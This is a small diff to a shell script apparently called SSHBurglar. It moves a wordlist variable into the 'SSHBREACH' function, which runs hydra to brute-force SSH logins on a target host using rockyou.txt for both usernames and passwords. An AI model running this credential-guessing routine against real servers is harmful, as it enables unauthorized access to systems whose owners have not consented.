@@ -50,7 +50,6 @@ function INSTALL()
 	sudo cp rockyou.txt ~/SSHBurglar/wordlist.txt
 	cd ~/SSHBurglar
 	sudo sed -i '1i kali' wordlist.txt
-	WordList=~/SSHBurglar/wordlist.txt
 	echo "[+] Wordlist created: ~/SSHBurglar/wordlist.txt"
 	echo " "
 	
@@ -93,6 +92,7 @@ function SSHBREACH()
 	echo " "
 	echo "[*] EXECUTION OF SSH_BREACH MODULE:"
 	echo " "
+	WordList=~/SSHBurglar/wordlist.txt
 	sudo hydra -f -L $WordList -P $WordList $vpsip ssh -t 4 -vV > crackedusers.txt
 	crackstatus=$(cat crackedusers.txt | grep host: | awk '{print $2}')
 	
